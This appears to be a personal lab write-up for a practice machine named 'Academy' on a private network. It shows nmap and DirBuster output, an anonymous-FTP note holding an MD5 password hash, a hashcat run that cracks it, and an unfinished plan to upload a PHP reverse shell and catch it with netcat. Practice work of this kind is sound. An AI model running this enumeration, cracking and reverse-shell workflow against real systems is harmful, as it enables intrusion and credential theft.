---
title: "T1-8-Academy"
tags:
  - fetus
---
## nmap results
- `nmap -sV -O 10.0.2.6`:
```js title:"nmap -sV -O 10.0.2.6" fold
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 17:44 EDT
Nmap scan report for 10.0.2.6
Host is up (0.062s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:5D:4C:44 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.25 seconds
```
- `nmap -T4 -p- -A 10.0.2.6`:
```js title:"nmap -T4 -p- -A 10.0.2.6" fold
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 17:36 EDT
Nmap scan report for 10.0.2.6
Host is up (0.093s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:5D:4C:44 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT      ADDRESS
1   92.68 ms 10.0.2.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.35 seconds
```
	

## dir fuzzing results:
- dirbuster results:
```c title:"dirbuster results" fold
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Thu Mar 20 10:38:33 EDT 2025
--------------------------------

http://10.0.2.6:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/academy/
/academy/assets/js/
/academy/assets/
/academy/admin/
/academy/assets/css/
/academy/assets/fonts/
/academy/assets/img/
/academy/admin/assets/
/academy/admin/assets/js/
/academy/admin/assets/css/
/academy/admin/assets/fonts/
/academy/admin/assets/img/
/academy/includes/
/academy/db/
/academy/admin/includes/
/phpmyadmin/

Dirs found with a 403 response:

/icons/
/icons/small/
/phpmyadmin/templates/
/phpmyadmin/themes/
/phpmyadmin/doc/
/phpmyadmin/doc/html/
/phpmyadmin/examples/
/phpmyadmin/js/
/phpmyadmin/libraries/
/phpmyadmin/vendor/
/phpmyadmin/doc/html/_images/
/phpmyadmin/vendor/google/
/phpmyadmin/js/vendor/
/phpmyadmin/setup/lib/
/phpmyadmin/sql/
/phpmyadmin/themes/original/
/phpmyadmin/themes/original/img/
/phpmyadmin/themes/original/css/

Dirs found with a 401 response:

/phpmyadmin/setup/


--------------------------------
Files found during testing:

Files found with a 301 responce:

/icons/small
/academy/assets/img
/academy/admin
/academy/assets
/academy/admin/assets
/academy
/academy/admin/assets/img
/academy/includes
/academy/assets/css
/academy/admin/includes
/academy/db
/academy/admin/assets/css
/academy/assets/js
/academy/admin/assets/js
/academy/assets/fonts
/academy/admin/assets/fonts
/phpmyadmin/themes
/phpmyadmin
/phpmyadmin/doc
/phpmyadmin/doc/html
/phpmyadmin/examples
/phpmyadmin/js
/phpmyadmin/doc/html/_images
/phpmyadmin/vendor
/phpmyadmin/vendor/google
/phpmyadmin/js/vendor
/phpmyadmin/sql
/phpmyadmin/themes/original
/phpmyadmin/themes/original/img
/phpmyadmin/themes/original/css

Files found with a 200 responce:

/icons/README
/academy/index.php
/academy/assets/js/bootstrap.js
/academy/assets/js/jquery-1.11.1.js
/academy/admin/index.php
/academy/assets/fonts/FontAwesome.otf
/academy/assets/css/bootstrap.css
/academy/assets/css/style.css
/academy/admin/assets/js/bootstrap.js
/academy/assets/fonts/fontawesome-webfont.eot
/academy/admin/assets/js/jquery-1.11.1.js
/academy/assets/css/font-awesome.css
/academy/admin/assets/css/bootstrap.css
/academy/assets/fonts/fontawesome-webfont.svg
/academy/admin/assets/css/style.css
/academy/assets/fonts/fontawesome-webfont.woff
/academy/admin/assets/fonts/FontAwesome.otf
/academy/assets/fonts/fontawesome-webfont.ttf
/academy/admin/assets/fonts/fontawesome-webfont.eot
/academy/assets/fonts/fontawesome-webfont.woff2
/academy/assets/fonts/glyphicons-halflings-regular.eot
/academy/assets/fonts/glyphicons-halflings-regular.svg
/academy/admin/assets/fonts/fontawesome-webfont.ttf
/academy/admin/assets/fonts/fontawesome-webfont.svg
/academy/admin/assets/fonts/fontawesome-webfont.woff
/academy/admin/assets/fonts/glyphicons-halflings-regular.eot
/academy/assets/fonts/glyphicons-halflings-regular.woff
/academy/assets/fonts/glyphicons-halflings-regular.woff2
/academy/admin/assets/fonts/glyphicons-halflings-regular.woff
/academy/admin/assets/fonts/glyphicons-halflings-regular.svg
/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2
/academy/assets/fonts/glyphicons-halflings-regular.ttf
/academy/admin/assets/css/font-awesome.css
/academy/includes/config.php
/academy/includes/footer.php
/academy/includes/menubar.php
/academy/includes/header.php
/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf
/academy/admin/assets/fonts/fontawesome-webfont.woff2
/academy/db/onlinecourse.sql
/academy/admin/includes/config.php
/academy/admin/includes/footer.php
/academy/admin/includes/header.php
/academy/admin/includes/menubar.php
/academy/logout.php
/academy/admin/logout.php
/phpmyadmin/index.php
/phpmyadmin/themes.php
/phpmyadmin/ajax.php
/phpmyadmin/navigation.php
/phpmyadmin/license.php
/phpmyadmin/README
/phpmyadmin/logout.php
/phpmyadmin/changelog.php
/phpmyadmin/export.php
/phpmyadmin/ChangeLog
/phpmyadmin/js/messages.php
/phpmyadmin/sql.php
/phpmyadmin/LICENSE

Files found with a 302 responce:

/academy/print.php
/academy/admin/print.php
/academy/admin/course.php
/academy/admin/department.php
/phpmyadmin/url.php
/academy/enroll.php
/academy/admin/session.php

Files found with a 403 responce:

/phpmyadmin/templates
/phpmyadmin/libraries
/phpmyadmin/setup/lib

Files found with a 401 responce:

/phpmyadmin/setup


--------------------------------
```
	

## directory notes: 

- `http://10.0.2.6/academy/admin/` seems to have default admin:admin credentials tf
- `http://10.0.2.6/academy/index.php` seems interesting. need student creds to login. will have to find that elsewhere i think. imma try enumming ftp next
- `http://10.0.2.6/phpmyadmin/index.php` might wanna try SQLi. simple payloads didnt work tho
## ftp files:
- note.txt:
``` title:note.txt fold
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```
- note.txt info:
``` title:"note.txt info" fold
StudentRegno: 10201321  
studentPhoto: ''  
password: cd73502828457d15655bbd7a63fb0bc8  
studentName: Rum Ham  
pincode: 777777  
session: ''  
department: ''  
semester: ''  
cgpa: 7.60  
creationdate: 2021-05-29 14:36:56  
updationDate: ''
```
- note.txt non blank info:
``` title:"note.txt non blank info" fold
StudentRegno: 10201321  
password: cd73502828457d15655bbd7a63fb0bc8  
studentName: Rum Ham  
pincode: 777777  
cgpa: 7.60  
creationdate: 2021-05-29 14:36:56
```
- possible unames:
``` title:"possible unames" fold
Rum Ham 
Heath
Grimmie
jdelta
```
	

## cracking the pass with [[hashcat]]:
- `hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`:
```c title:"hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt" fold
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-penryn-AMD Ryzen 9 9900X 12-Core Processor, 10542/21148 MB (4096 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

cd73502828457d15655bbd7a63fb0bc8:student                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: cd73502828457d15655bbd7a63fb0bc8
Time.Started.....: Thu Mar 20 11:31:58 2025 (0 secs)
Time.Estimated...: Thu Mar 20 11:31:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   256.1 kH/s (0.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/14344385 (0.09%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hawkeye
Hardware.Mon.#1..: Util:  1%

Started: Thu Mar 20 11:31:41 2025
Stopped: Thu Mar 20 11:32:00 2025
```
- cracked pass:
```c title:"cracked pass" fold
cd73502828457d15655bbd7a63fb0bc8:student
```

## getting a shell through `http://10.0.2.6/academy/my-profile.php`:

- get [[pentestMonkey-PHP_reverse_shell]] and modify it as needed and upload it
- use [[netcat]] 
- 